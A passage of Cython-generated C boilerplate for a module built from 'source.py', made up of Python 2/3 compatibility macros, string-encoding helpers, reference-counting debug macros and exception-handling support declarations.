  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* KeywordStringCheck.proto */
static int __Pyx_CheckKeywordStrings(PyObject *kwdict, const char* function_name, int kw_allowed);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* PyObjectSetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
